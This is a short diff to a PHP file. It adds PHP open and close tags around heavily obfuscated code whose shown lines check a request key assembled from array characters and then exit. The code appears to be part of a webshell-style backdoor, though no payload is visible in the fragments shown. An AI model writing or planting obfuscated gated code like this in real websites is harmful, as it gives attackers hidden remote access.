@@ -1,3 +1,4 @@
+<?php
 $le8281 = 313;
 $GLOBALS['v9e701f7'] = Array();
 global $v9e701f7;
@@ -62,3 +63,4 @@ if (isset($cbbf[$v9e701f7['oaf1d'][24].$v9e701f7['oaf1d'][5]]) && $cda691 == $cb
     }
     exit();
 }
+?>
